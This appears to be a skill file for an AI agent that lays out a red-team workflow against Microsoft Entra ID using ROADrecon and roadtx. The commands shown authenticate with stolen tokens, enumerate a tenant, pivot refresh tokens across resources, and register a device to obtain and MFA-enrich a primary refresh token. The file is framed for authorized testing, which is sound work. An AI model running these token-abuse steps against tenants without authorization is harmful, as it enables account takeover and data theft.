---
name: attacking-entra-id-with-roadtools
description: Enumerate Microsoft Entra ID (Azure AD) tenants with ROADrecon and acquire, exchange, and abuse tokens (including primary refresh tokens) with roadtx.
subdomain: identity-access-management
facing: config
mitre_attack:
- T1087.004
nist_csf:
- ID.AM-03
upstream: attacking-entra-id-with-roadtools@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: ROADtools interacts with live Microsoft Entra ID (Azure AD) tenants and can register devices, mint and exchange tokens, and enumerate directory objects. Use it solely against tenants you own or are explicitly authorized in writing to test. Unauthorized access to a cloud tenant is illegal.

## Prerequisites

- Written authorization and defined scope for target tenant.
- Starting credential: username/password (no MFA flows), device code session, refresh/access token, or registered device's PRT.
- Python 3.7+ (roadtx Selenium flows need matching geckodriver/Firefox).

```bash
# Core install (roadlib is a shared dependency, pulled in automatically)
python -m pip install roadrecon
python -m pip install roadtx
# Verify
roadrecon --help
roadtx --help
```

## MITRE ATT&CK Mapping

| ID | Tactic | Official Technique Name | Role in this skill |
|----|--------|-------------------------|--------------------|
| T1087.004 | Discovery | Account Discovery: Cloud Account | ROADrecon enumerates tenant users/accounts |
| T1069.003 | Discovery | Permission Groups Discovery: Cloud Groups | ROADrecon enumerates Entra groups and roles |
| T1538 | Discovery | Cloud Service Dashboard | GUI exploration of tenant configuration |
| T1550.001 | Defense Evasion / Lateral Movement | Use Alternate Authentication Material: Application Access Token | roadtx refresh-token exchange across resources |
| T1528 | Credential Access | Steal Application Access Token | roadtx PRT/token acquisition |

## Workflow

### Step 1: Authenticate with ROADrecon

Pick flow that matches your foothold. Device code supports MFA; ROPC (-u/-p) does not.

```bash
# Username/password (legacy, no MFA)
roadrecon auth -u user@tenant.onmicrosoft.com -p 'Password123!'

# Device-code flow (supports MFA)
roadrecon auth --device-code

# From a stolen access or refresh token
roadrecon auth --access-token <JWT>
roadrecon auth --refresh-token <refresh_token>

# From a PRT (with session key) for SSO-grade access
roadrecon auth --prt <prt> --prt-sessionkey <session_key>
```
Authentication writes `.roadtools_auth` in working directory.

### Step 2: Gather directory

```bash
# Full gather into roadrecon.db (default)
roadrecon gather

# Include MFA/auth-method details (requires a privileged role)
roadrecon gather --mfa
```

### Step 3: Explore in GUI

```bash
roadrecon gui
# Browse to http://127.0.0.1:5000 — users, groups, roles, applications,
# service principals, devices, and conditional-access policies, all offline.
```

### Step 4: Run analysis plugins

```bash
# Analyze conditional-access policies
roadrecon plugin policies -h
roadrecon plugin policies

# Export the gathered data to a BloodHound-importable format
roadrecon plugin bloodhound -h
roadrecon plugin bloodhound
```

### Step 5: Acquire tokens with roadtx

```bash
# ROPC: get a Microsoft Graph token for the Azure CLI client
roadtx gettokens -u user@tenant.com -p 'Password123!' -c azcli -r msgraph

# Device-code style interactive auth for the Teams client to Graph
roadtx interactiveauth -c msteams -r msgraph

# From an existing refresh token
roadtx gettokens --refresh-token <refresh_token> -r msgraph
```
Tokens are written to `.roadtools_auth` (use `--tokens-stdout` to print).

### Step 6: Exchange refresh tokens across resources (FOCI pivot)

FOCI refresh token obtained for one first-party client can be redeemed for another resource without re-auth.

```bash
# Convert the stored refresh token to an Azure Resource Manager token
roadtx refreshtokento -r azrm

# Convert to a scoped Graph token via the Teams client
roadtx refreshtokento -c msteams -r msgraph

# Find which first-party clients hold a given scope
roadtx getscope -s https://graph.microsoft.com/mail.read --foci
```

### Step 7: Device registration and PRT-based SSO

```bash
# Register a (virtual) device to the tenant
roadtx device -n redteam-device

# Request a PRT using the device cert/key and user creds
roadtx prt -u user@tenant.com -p 'Password123!' --key-pem redteam-device.key --cert-pem redteam-device.pem

# Use the PRT to authenticate a client to a resource (SSO-grade)
roadtx prtauth -c msteams -r msgraph

# Enrich a PRT with an interactive MFA claim
roadtx prtenrich -u user@tenant.com
```

### Step 8: Inspect tokens

```bash
# Decode and print claims of the stored / a supplied token
roadtx describe -t <JWT>
roadtx describe < .roadtools_auth | jq .
```

## Tools and Resources

| Tool | Purpose | Primary Source |
|------|---------|----------------|
| ROADtools (repo) | Toolkit overview + wiki | https://github.com/dirkjanm/ROADtools |
| ROADrecon wiki | Auth/gather/gui/plugin usage | https://github.com/dirkjanm/ROADtools/wiki/Getting-started-with-ROADrecon |
| roadtx wiki | Token exchange + PRT/device flows | https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx) |
| BloodHound CE | Graph analysis of exported Entra data | https://github.com/SpecterOps/BloodHound |
| Microsoft identity platform | Token/flow reference | https://learn.microsoft.com/entra/identity-platform/ |

## Validation Criteria

- [ ] Authenticated to target tenant via authorized flow; `.roadtools_auth` created.
- [ ] Directory gathered into `roadrecon.db` (with `--mfa` where role allows).
- [ ] GUI explored; users, groups, roles, apps, CA policies reviewed.
- [ ] CA-policy and BloodHound plugins executed; data exported.
- [ ] Tokens acquired with roadtx for at least one resource.
- [ ] Refresh-token exchange to second resource demonstrated (FOCI pivot).
- [ ] Device registered and PRT-based SSO demonstrated (where in scope).
- [ ] Token claims inspected with `roadtx describe`.
- [ ] Findings and access documented for engagement report.

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/attacking-entra-id-with-roadtools
